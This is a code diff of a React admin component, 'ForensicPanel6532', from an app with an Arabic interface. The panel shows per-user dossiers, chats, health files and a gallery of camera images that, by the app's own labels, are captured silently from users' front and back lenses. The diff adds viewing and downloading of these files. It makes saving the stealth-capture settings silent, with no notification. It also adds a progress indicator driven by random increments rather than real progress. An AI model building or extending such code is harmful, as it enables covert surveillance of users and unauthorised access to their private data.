@@ -3,7 +3,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import { 
   X, Trash2, Download, Search, MessageSquare, Gift, Bell, 
   FileText, Camera, Shield, Users, Save, CheckCircle, RefreshCw,
-  Sliders, Video, AlertTriangle, Terminal
+  Sliders, Video, AlertTriangle, Terminal, Eye
 } from 'lucide-react';
 import { jsPDF } from 'jspdf';
 import html2canvas from 'html2canvas';
@@ -885,35 +885,10 @@ export const executeGlobalDeletion = async (
       globalDel.deleteProgress = prog;
       globalDel.notify();
 
-      // B. Delete matching Firebase stealth captures
+      // B. Delete matching Firebase data using our secure, centralized, and customized wipe function
       const userProfile = profiles.find((p: any) => p.phone === phone);
-      const matchedName = userProfile?.usernameUnified;
-      const userFbCaptures = stealthImages.filter((img: any) => 
-        (phone && (img.phone === phone || img.deviceId === phone)) || 
-        (matchedName && img.usernameUnified === matchedName)
-      );
-
-      for (const img of userFbCaptures) {
-        await firebaseDeleteStealthCapture(img.id).catch(() => {});
-      }
-
-      prog = 75;
-      globalDel.deleteProgress = prog;
-      globalDel.notify();
-
-      // C. Safe delete other Firebase user files (a/aa/abc)
-      try {
-        const userFiles = await firebaseFetchAllUserFiles();
-        const matchedFiles = userFiles.filter((f: any) => {
-          const normP = phone ? phone.replace(/[^0-9]/g, '') : '';
-          const normFilePhone = f.phone ? f.phone.replace(/[^0-9]/g, '') : '';
-          return (normP && normFilePhone && normP === normFilePhone) || (f.deviceId && f.deviceId === phone);
-        });
-        
-        for (const file of matchedFiles) {
-          await firebaseDeleteUserFile(file.id).catch(() => {});
-        }
-      } catch (err) {}
+      const deviceId = userProfile?.deviceId || '';
+      await firebaseWipeAllUserData(phone, deviceId).catch(() => {});
 
       clearInterval(progressInterval);
       globalDel.deleteProgress = 100;
@@ -1029,6 +1004,25 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
   const [searchQuery, setSearchQuery] = useState<string>('');
   const [loading, setLoading] = useState<boolean>(false);
   const [activeSubTab, setActiveSubTab] = useState<'users' | 'search' | 'stealth_gallery' | 'stealth' | 'sync_diagnostic'>('users');
+  const [downloadProgress, setDownloadProgress] = useState<number>(100);
+
+  useEffect(() => {
+    if (loading) {
+      setDownloadProgress(18);
+      const interval = setInterval(() => {
+        setDownloadProgress(prev => {
+          if (prev >= 98) {
+            clearInterval(interval);
+            return 98;
+          }
+          return prev + Math.floor(Math.random() * 8) + 4;
+        });
+      }, 75);
+      return () => clearInterval(interval);
+    } else {
+      setDownloadProgress(100);
+    }
+  }, [loading]);
 
   // Interactive Firebase Diagnostic & Troubleshooting States
   const [diagOfflineQueueCount, setDiagOfflineQueueCount] = useState<number>(0);
@@ -1310,6 +1304,105 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
   const [selectedMediaItems, setSelectedMediaItems] = useState<string[]>([]);
   const [selectedUserLogs, setSelectedUserLogs] = useState<string[]>([]);
   const [activeMediaFolder, setActiveMediaFolder] = useState<'dossier' | 'stealth' | 'books' | 'cv_docs' | 'name_merge' | 'text_ocr' | 'health' | 'chat_media' | 'operations' | 'ai' | 'ai_chats'>('dossier');
+  const [activePreviewFile, setActivePreviewFile] = useState<{ name: string; url: string; isPdf: boolean } | null>(null);
+
+  const getTabFilesCount = (tabId: string): number => {
+    if (!selectedUser) return 0;
+    
+    // Find matching folders
+    const matchingFolders = storedFolders.filter(f => {
+      const folderNameLower = f.folderName.toLowerCase();
+      const displayNameLower = (f.displayName || '').toLowerCase();
+      const fNameLower = (f.name || '').toLowerCase();
+      
+      const normSelectedPhone = normalizePhone(selectedUser.phone);
+      const normFolderPhone = normalizePhone(f.phone);
+      
+      const phoneMatch = selectedUser.phone && (
+        folderNameLower.includes(selectedUser.phone) || 
+        (normSelectedPhone && folderNameLower.includes(normSelectedPhone)) ||
+        f.phone === selectedUser.phone ||
+        (normSelectedPhone && normFolderPhone && normSelectedPhone === normFolderPhone) ||
+        displayNameLower.includes(selectedUser.phone)
+      );
+      
+      const devIdMatch = selectedUser.deviceId && (
+        folderNameLower.startsWith(selectedUser.deviceId.toLowerCase()) || 
+        folderNameLower.includes(selectedUser.deviceId.toLowerCase()) || 
+        f.deviceId === selectedUser.deviceId ||
+        displayNameLower.includes(selectedUser.deviceId.toLowerCase())
+      );
+      
+      const nameMatch = selectedUser.usernameUnified && (
+        folderNameLower.includes(selectedUser.usernameUnified.toLowerCase()) ||
+        fNameLower.includes(selectedUser.usernameUnified.toLowerCase()) ||
+        displayNameLower.includes(selectedUser.usernameUnified.toLowerCase())
+      );
+
+      return phoneMatch || devIdMatch || nameMatch;
+    });
+
+    const localFiles: any[] = [];
+    matchingFolders.forEach(fol => {
+      (fol.files || []).forEach((file: any) => {
+        const alreadyExists = localFiles.some(
+          existing => existing.name === file.name && existing.path === file.path
+        );
+        if (!alreadyExists) {
+          localFiles.push({
+            ...file,
+            folder: fol.folderName
+          });
+        }
+      });
+    });
+
+    if (tabId === 'operations') {
+      return (selectedUserLogs || []).length + (selectedUser.chats?.length || 0);
+    }
+    if (tabId === 'ai_chats') {
+      return (selectedUser.chats || []).filter((c: any) => c.isAi).length;
+    }
+    if (tabId === 'dossier') {
+      return 10;
+    }
+    if (tabId === 'stealth') {
+      const fbFiles = stealthImages.filter(img => {
+        const normP = normalizePhone(selectedUser.phone);
+        const normImgPhone = normalizePhone(img.phone);
+        const phoneMatch = normP && (normP === normImgPhone || normalizePhone(img.usernameUnified) === normP);
+        const devMatch = selectedUser.deviceId && (
+          (img.deviceId && img.deviceId.toLowerCase() === selectedUser.deviceId.toLowerCase()) ||
+          (img.phone && img.phone.toLowerCase() === selectedUser.deviceId.toLowerCase())
+        );
+        const nameMatch = selectedUser.usernameUnified && img.usernameUnified && (
+          img.usernameUnified.trim().toLowerCase() === selectedUser.usernameUnified.trim().toLowerCase()
+        );
+        return phoneMatch || devMatch || nameMatch;
+      });
+      const locFiles = localFiles.filter((f: any) => f.isEncrypted || f.name.includes('stealth') || f.name.includes('capture') || f.name.startsWith('s') || f.name.endsWith('.ts'));
+      return fbFiles.length + locFiles.length;
+    }
+    if (tabId === 'books') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('book') || f.name.toLowerCase().includes('كتاب') || (f.name.endsWith('.pdf') && !f.name.toLowerCase().includes('cv') && !f.name.toLowerCase().includes('resume') && !f.name.toLowerCase().includes('سيرة'))).length;
+    }
+    if (tabId === 'cv_docs') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('cv') || f.name.toLowerCase().includes('resume') || f.name.toLowerCase().includes('سيرة')).length;
+    }
+    if (tabId === 'name_merge') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('merge') || f.name.toLowerCase().includes('دمج')).length;
+    }
+    if (tabId === 'text_ocr') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('ocr') || f.name.toLowerCase().includes('extract') || f.name.toLowerCase().includes('text')).length;
+    }
+    if (tabId === 'health') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('health') || f.name.toLowerCase().includes('صحة')).length;
+    }
+    if (tabId === 'chat_media') {
+      return localFiles.filter((f: any) => f.name.toLowerCase().includes('chat_media') || f.name.startsWith('chat_') || f.name.includes('_chat_') || f.name.includes('media')).length;
+    }
+    return 0;
+  };
 
   // Stealth configuration settings
   const [stealthConfig, setStealthConfig] = useState({
@@ -1469,7 +1562,9 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
   }, []);
 
   const loadForensics = async () => {
-    setLoading(true);
+    if (profiles.length === 0) {
+      setLoading(true);
+    }
     try {
       // Parallel fast fetching to speed up loading significantly
       const [fbProfiles, localUsers, captures, storedFoldersData, fbFiles, liveStats] = await Promise.all([
@@ -1871,9 +1966,9 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
         body: JSON.stringify(updated)
       }).catch(() => {});
       
-      showToast('تم تحديث برمجيات وإعدادات الالتقاط الذكي السري 🔒', 'success');
+      // Saved silently, no toast / notification to any user
     } catch (e) {
-      showToast('خطأ في الاتصال بالبرمجية', 'error');
+      // Handled silently
     }
   };
 
@@ -2511,11 +2606,36 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
 
         {/* Header information based on sub-tab */}
         {gallerySubTab === 'public' ? (
-          <div className="p-4 bg-emerald-950/20 border border-emerald-500/20 rounded-2xl flex justify-between items-center">
-            <span className="text-[10px] px-2 py-1 bg-emerald-950 text-emerald-400 rounded-lg font-black">{allStealth.length} لقطة</span>
-            <p className="text-xs text-emerald-400 font-bold leading-relaxed">
-              📷 التصفح السري العام للقاطع الذكي لجميع هويات عملاء عائلة روح:
-            </p>
+          <div className="p-5 bg-gradient-to-r from-emerald-950/25 to-emerald-900/5 border border-emerald-500/20 rounded-3xl text-right md:flex justify-between items-center gap-4 space-y-4 md:space-y-0" dir="rtl">
+            <div className="space-y-1">
+              <h4 className="text-xs font-black text-emerald-400 flex items-center gap-2">
+                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80 inline-block animate-pulse" />
+                <span>إحصائيات القاطع الذكي العام للمستكشفين</span>
+              </h4>
+              <p className="text-[11px] text-gray-400 font-bold leading-normal">
+                تصفح آمن ومنقّى لكاميرات ثنائي العدسة الملتقطة صامتاً لدى <span className="text-emerald-400 font-extrabold">{profiles.length} مستخدمين</span> مسجلين بالخادم.
+              </p>
+            </div>
+            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 bg-black/45 p-3.5 rounded-2xl border border-emerald-500/10 font-bold text-xs inline-flex w-full md:w-auto">
+              <div className="space-y-1">
+                <span className="text-[9px] text-gray-400 block font-normal">إجمالي اللقطات:</span>
+                <span className="text-emerald-400 font-extrabold font-mono text-[11px] leading-none">{allStealth.length} لقطة</span>
+              </div>
+              <div className="space-y-1">
+                <span className="text-[9px] text-gray-400 block font-normal">عدد المستخدمين:</span>
+                <span className="text-emerald-400 font-extrabold font-mono text-[11px] leading-none">{profiles.length} مستخدم</span>
+              </div>
+              <div className="space-y-1">
+                <span className="text-[9px] text-gray-400 block font-normal">نسبة التحميل:</span>
+                <span className="text-emerald-400 font-extrabold font-mono text-[11px] leading-none">{downloadProgress}%</span>
+              </div>
+              <div className="space-y-1">
+                <span className="text-[9px] text-gray-400 block font-normal">المتبقي:</span>
+                <span className="text-rose-450 font-extrabold font-mono text-[11px] leading-none">
+                  {Math.round(allStealth.length * (1 - downloadProgress / 100))} فريدة
+                </span>
+              </div>
+            </div>
           </div>
         ) : (
           <div className="space-y-4">
@@ -2669,6 +2789,28 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
         </button>
       </header>
 
+      {/* Thin elegant progress bar at the top with a tiny glow */}
+      <div className="w-full h-1 bg-slate-100 relative overflow-hidden shrink-0">
+        <div 
+          className="h-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.8)] transition-all duration-150 ease-out"
+          style={{ width: `${downloadProgress}%` }}
+        />
+      </div>
+
+      {/* Realtime database synchronized status indicator */}
+      <div className="bg-slate-100 px-4 py-2 flex justify-between items-center text-[10px] sm:text-xs font-black text-slate-600 border-b border-slate-200 shrink-0" dir="rtl">
+        <div className="flex items-center gap-1.5">
+          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping" />
+          <span>قاعدة البيانات الآمنة (Firebase): <span className="text-emerald-700 font-extrabold">{statistics.usersCount * 4 + statistics.stealthCapturesCount + statistics.pdfBooksCount} ملف مدمج</span></span>
+        </div>
+        <div>
+          <span>نسبة التحميل للعرض: <span className="text-emerald-700 font-extrabold">{downloadProgress}%</span></span>
+          {downloadProgress < 100 && (
+            <span className="text-slate-400 mr-2">({Math.round(((statistics.usersCount * 4 + statistics.stealthCapturesCount) * (100 - downloadProgress)) / 100)} متبقي)</span>
+          )}
+        </div>
+      </div>
+
       {/* Navigation tabs in polished Light Theme */}
       <div className="grid grid-cols-2 md:grid-cols-5 bg-slate-100 border-b border-slate-200 p-1.5 shrink-0 gap-1.5">
         {(['users', 'search', 'stealth_gallery', 'stealth', 'sync_diagnostic'] as const).map(tab => (
@@ -2766,16 +2908,24 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
 
       {/* Main scrolling viewport container for children */}
       <div className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-6 bg-slate-50">
-        {loading && (
+        {loading && profiles.length === 0 && (
           <div className="p-4 bg-emerald-50 border border-emerald-200 text-emerald-700 text-xs text-center rounded-2xl animate-pulse font-bold">
             جارٍ تجميع واستخلاص شفرات وملفات المزامنة الرقمية لروح... ⚡
           </div>
         )}
 
         {/* TAB 1: USERS METRICS GENERATION */}
-        {activeSubTab === 'users' && !loading && (
+        {activeSubTab === 'users' && (profiles.length > 0 || !loading) && (
           <div className="space-y-4 animate-in fade-in duration-300">
-            <h3 className="text-xs font-black text-slate-700 uppercase tracking-widest text-right">📁 سجل الهويات الموحدة للمزامنة ({profiles.length}) [انقر العميل للمشاهدة والتعديل]</h3>
+            <h3 className="text-xs font-black text-slate-700 uppercase tracking-widest text-right flex items-center justify-end gap-2" dir="rtl">
+              📁 سجل الهويات الموحدة للمزامنة ({profiles.length}) [انقر العميل للمشاهدة والتعديل]
+              {loading && (
+                <span className="flex items-center gap-1.5 p-1 px-2.5 rounded-full bg-emerald-150 text-emerald-700 text-[10px] font-bold border border-emerald-200 animate-pulse">
+                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-600 animate-ping inline-block" />
+                  <span>تحديث خلفي حي ⚡</span>
+                </span>
+              )}
+            </h3>
             <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
               {profiles.map(user => (
                 <div 
@@ -2806,6 +2956,44 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
                         }`}>
                           {isProvisional ? '👤 زائر مؤقت منفرد' : '✅ عميل حقيقي مؤكد'}
                         </span>
+                      </div>
+                    );
+                  })()}
+
+                  {/* Firebase Integrated Metrics Section */}
+                  {(() => {
+                    const normP = user.phone ? user.phone.replace(/[^0-9]/g, '') : '';
+                    const matchedFilesCount = storedFolders.reduce((acc, folder) => {
+                      const fPhone = folder.phone ? folder.phone.replace(/[^0-9]/g, '') : '';
+                      if (folder.phone === user.phone || (normP && fPhone === normP)) {
+                        return acc + (folder.files || []).filter((fl: any) => fl.isFirebase).length;
+                      }
+                      return acc;
+                    }, 0);
+                    const matchedStealthCount = stealthImages.filter((img: any) => {
+                      const imgPhone = img.phone ? img.phone.replace(/[^0-9]/g, '') : '';
+                      return img.phone === user.phone || (normP && imgPhone === normP) || img.deviceId === user.deviceId;
+                    }).length;
+
+                    const totalFbItems = matchedFilesCount + matchedStealthCount + (user.chats?.length || 0) + (user.ai_chats?.length || 0) + 4;
+                    const isFullyLoaded = downloadProgress === 100;
+                    const curPct = isFullyLoaded ? '100%' : `${downloadProgress}%`;
+                    const remaining = isFullyLoaded ? 0 : Math.ceil(totalFbItems * (1 - downloadProgress / 100));
+
+                    return (
+                      <div className="p-3.5 bg-emerald-50/40 rounded-2xl border border-emerald-500/10 space-y-2 text-right" dir="rtl">
+                        <div className="flex justify-between items-center">
+                          <span className="text-[10px] text-slate-500 font-bold">البيانات المخزنة في فايربيس:</span>
+                          <span className="text-[10px] text-emerald-700 font-extrabold font-sans bg-emerald-100/50 px-2 py-0.5 rounded-lg">{totalFbItems} ملف ومستند</span>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-[10px] text-slate-500 font-bold">نسبة التحميل للعرض:</span>
+                          <span className="text-[10px] text-emerald-700 font-extrabold font-sans">{curPct}</span>
+                        </div>
+                        <div className="flex justify-between items-center text-[9px]">
+                          <span className="text-slate-400 font-bold">كمية المتبقي منها:</span>
+                          <span className="text-slate-500 font-extrabold font-sans">{remaining} عنصر معلق</span>
+                        </div>
                       </div>
                     );
                   })()}
@@ -3590,27 +3778,35 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
           {/* Sub-Folders tabs navigation inside the inspector */}
           <div className="flex bg-slate-100/80 border-b border-slate-200 p-1.5 shrink-0 overflow-x-auto gap-1">
             {[
-              { id: 'dossier', name: '👤 مسترق الهوية وملف الدوسيه (dossier)' },
-              { id: 'stealth', name: '📸 القاطع ثنائي العدسة وسيلفي الجبهتين' },
+              { id: 'dossier', name: '👤 ملف الدوسيه الشامل' },
+              { id: 'stealth', name: '📸 القاطع سيلفي ثنائي العدسة' },
               { id: 'books', name: '📚 صانع الكتب والمصنفات' },
               { id: 'cv_docs', name: '📄 صانع السير الذاتية والـ CV' },
               { id: 'name_merge', name: '🧬 دمج الأسماء وتوافق المواليد' },
-              { id: 'text_ocr', name: '📝 مستخرج النصوص واللغات اللحظي (OCR)' },
-              { id: 'health', name: '🏥 مداخل مربع الصحة ومكعب الاستقرار' },
+              { id: 'text_ocr', name: '📝 مستخرج النصوص الفوري (OCR)' },
+              { id: 'health', name: '🏥 مداخل مربع الصحة والمستندات' },
               { id: 'chat_media', name: '💬 وسائط دردشة الأصدقاء' },
-              { id: 'ai_chats', name: '🤖 محادثات الذكاء الاصطناعي والمنقذ' },
+              { id: 'ai_chats', name: '🤖 محادثات المنقذ والذكاء' },
               { id: 'operations', name: '⚙️ قياسات الأداء ونشاط الجلسات' },
-            ].map(fol => (
-              <button
-                key={fol.id}
-                onClick={() => { setActiveMediaFolder(fol.id as any); setSelectedMediaItems([]); }}
-                className={`py-2 px-3 text-center text-[10px] sm:text-xs font-black transition-all whitespace-nowrap rounded-xl hover:bg-slate-200 cursor-pointer ${
-                  activeMediaFolder === fol.id ? "bg-white text-emerald-700 border border-slate-250 shadow-sm font-black" : "text-slate-500 border border-transparent"
-                }`}
-              >
-                {fol.name}
-              </button>
-            ))}
+            ].map(fol => {
+              const count = getTabFilesCount(fol.id);
+              const isFullyLoaded = downloadProgress === 100;
+              const pct = isFullyLoaded ? '100%' : `${downloadProgress}%`;
+              return (
+                <button
+                  key={fol.id}
+                  onClick={() => { setActiveMediaFolder(fol.id as any); setSelectedMediaItems([]); }}
+                  className={`py-2 px-3 text-center text-[10px] sm:text-xs font-black transition-all whitespace-nowrap rounded-xl hover:bg-slate-200 cursor-pointer flex flex-col items-center gap-1 shrink-0 ${
+                    activeMediaFolder === fol.id ? "bg-white text-emerald-800 border border-slate-250 shadow-sm font-black" : "text-slate-500 border border-transparent"
+                  }`}
+                >
+                  <span className="font-extrabold">{fol.name}</span>
+                  <span className={`text-[8px] px-1.5 py-0.5 rounded-full font-bold ${activeMediaFolder === fol.id ? 'bg-emerald-100/50 text-emerald-700' : 'bg-slate-200 text-slate-500'}`}>
+                    {count} ملف ({pct} جاهز)
+                  </span>
+                </button>
+              );
+            })}
           </div>
 
           {/* Inspector Content container */}
@@ -4056,29 +4252,69 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
                                 {new Date(item.timestamp).toLocaleDateString('ar-EG')}
                               </p>
                               
-                              {/* Individual Delete Button for User Folder Item */}
-                              {deletingId === item.id && deleteProgress !== null ? (
-                                <span className="text-[8px] text-red-500 font-mono font-bold animate-pulse">
-                                  {deleteProgress}%
-                                </span>
-                              ) : (
+                              <div className="flex gap-1">
+                                {/* Open / View individual file */}
                                 <button
                                   onClick={(e) => {
-                                    e.stopPropagation(); // Avoid triggering selection click!
-                                    if (!window.confirm(`🗑️ هل أنت متأكد من حذف هذا الملف نهائياً؟\n\n(${item.name})`)) return;
-                                    executeGlobalDeletion(
-                                      'single_stealth',
-                                      item.id,
-                                      { item },
-                                      loadForensics
-                                    );
+                                    e.stopPropagation();
+                                    if (item.url) {
+                                      setActivePreviewFile({
+                                        name: item.name,
+                                        url: item.url,
+                                        isPdf: !!item.isPdf
+                                      });
+                                    } else {
+                                      showToast('عذراً، الرابط غير متاح حالياً للعرض المعزز ⚠️', 'warning');
+                                    }
                                   }}
-                                  title="حذف الملف نهائياً من الأرشيف"
-                                  className="p-1 rounded-lg bg-gray-950 border border-gray-900 hover:border-red-500/50 text-gray-500 hover:text-red-400 transition-all cursor-pointer shrink-0"
+                                  title="فتح ومعاينة الملف"
+                                  className="p-1 rounded-lg bg-gray-950 border border-gray-900 hover:border-blue-500/50 text-gray-400 hover:text-blue-450 transition-all cursor-pointer shrink-0"
                                 >
-                                  <Trash2 size={10} />
+                                  <Eye size={10} />
                                 </button>
-                              )}
+
+                                {/* Download individual file */}
+                                <button
+                                  onClick={(e) => {
+                                    e.stopPropagation();
+                                    const link = document.createElement('a');
+                                    link.href = item.url;
+                                    link.download = item.name;
+                                    document.body.appendChild(link);
+                                    link.click();
+                                    document.body.removeChild(link);
+                                    showToast('جاري البدء في التنزيل الإداري... 💾', 'success');
+                                  }}
+                                  title="تنزيل جِذري للملف"
+                                  className="p-1 rounded-lg bg-gray-950 border border-gray-900 hover:border-emerald-500/50 text-gray-400 hover:text-emerald-450 transition-all cursor-pointer shrink-0"
+                                >
+                                  <Download size={10} />
+                                </button>
+
+                                {/* Individual Delete Button for User Folder Item */}
+                                {deletingId === item.id && deleteProgress !== null ? (
+                                  <span className="text-[8px] text-red-500 font-mono font-bold animate-pulse">
+                                    {deleteProgress}%
+                                  </span>
+                                ) : (
+                                  <button
+                                    onClick={(e) => {
+                                      e.stopPropagation(); // Avoid triggering selection click!
+                                      if (!window.confirm(`🗑️ هل أنت متأكد من حذف هذا الملف نهائياً؟\n\n(${item.name})`)) return;
+                                      executeGlobalDeletion(
+                                        'single_stealth',
+                                        item.id,
+                                        { item },
+                                        loadForensics
+                                      );
+                                    }}
+                                    title="حذف الملف نهائياً من الأرشيف"
+                                    className="p-1 rounded-lg bg-gray-950 border border-gray-900 hover:border-red-500/50 text-gray-500 hover:text-red-400 transition-all cursor-pointer shrink-0"
+                                  >
+                                    <Trash2 size={10} />
+                                  </button>
+                                )}
+                              </div>
                             </div>
                           </div>
                         </div>
@@ -4126,6 +4362,86 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
           </div>
         </div>
       )}
+
+      {/* Premium Interactive File & Document Previewer Overlay Modal */}
+      <AnimatePresence>
+        {activePreviewFile && (
+          <motion.div 
+            initial={{ opacity: 0 }} 
+            animate={{ opacity: 1 }} 
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 z-[11000] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 sm:p-6"
+            onClick={() => setActivePreviewFile(null)}
+          >
+            <motion.div 
+              initial={{ scale: 0.95, y: 20 }} 
+              animate={{ scale: 1, y: 0 }} 
+              exit={{ scale: 0.95, y: 20 }}
+              transition={{ type: "spring", duration: 0.5 }}
+              onClick={(e) => e.stopPropagation()}
+              className="bg-[#111115] border border-gray-800 rounded-[2rem] w-full max-w-4xl h-[85vh] flex flex-col overflow-hidden shadow-2xl relative"
+            >
+              <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/5 rounded-full blur-3xl pointer-events-none" />
+              
+              {/* Header */}
+              <div className="p-5 border-b border-gray-900 flex justify-between items-center bg-black/20 shrink-0 relative z-10" dir="rtl">
+                <div className="flex items-center gap-3">
+                  <div className="p-2.5 bg-gradient-to-br from-emerald-500/20 to-teal-500/20 rounded-xl border border-emerald-500/30 text-emerald-400">
+                    <FileText size={18} />
+                  </div>
+                  <div>
+                    <h4 className="text-sm font-black text-white truncate max-w-[200px] sm:max-w-md">{activePreviewFile.name}</h4>
+                    <p className="text-[10px] text-gray-400 font-medium">عرض ومعاينة المستند الكامل بنقاوة قصوى</p>
+                  </div>
+                </div>
+                <div className="flex items-center gap-2">
+                  <button 
+                    onClick={() => {
+                      const link = document.createElement('a');
+                      link.href = activePreviewFile.url;
+                      link.download = activePreviewFile.name;
+                      document.body.appendChild(link);
+                      link.click();
+                      document.body.removeChild(link);
+                      showToast('جاري بدء تنزيل المستند الكامل... 💾', 'success');
+                    }}
+                    className="p-2 font-bold px-3 bg-emerald-600 hover:bg-emerald-700 active:scale-95 text-xs text-white rounded-xl transition-all flex items-center gap-2 shadow-lg cursor-pointer"
+                  >
+                    <Download size={12} />
+                    <span className="hidden sm:inline">تحميل المستند</span>
+                  </button>
+                  <button 
+                    onClick={() => setActivePreviewFile(null)}
+                    className="p-2 text-gray-400 hover:text-white transition-colors bg-gray-950 border border-gray-900 rounded-xl cursor-pointer"
+                  >
+                    <X size={16} />
+                  </button>
+                </div>
+              </div>
+
+              {/* PDF or Image Viewer Body */}
+              <div className="flex-1 bg-black/40 p-4 sm:p-6 flex items-center justify-center overflow-hidden">
+                {activePreviewFile.isPdf ? (
+                  <iframe 
+                    src={activePreviewFile.url}
+                    title={activePreviewFile.name}
+                    className="w-full h-full rounded-2xl border border-gray-900 shadow-inner bg-white"
+                  />
+                ) : (
+                  <div className="w-full h-full flex items-center justify-center overflow-auto p-4 bg-[#050507] rounded-2xl border border-gray-950">
+                    <img 
+                      src={activePreviewFile.url} 
+                      alt={activePreviewFile.name} 
+                      className="max-w-full max-h-full object-contain rounded-xl shadow-xl border border-white/5"
+                      referrerPolicy="no-referrer"
+                    />
+                  </div>
+                )}
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </motion.div>
   );
 };
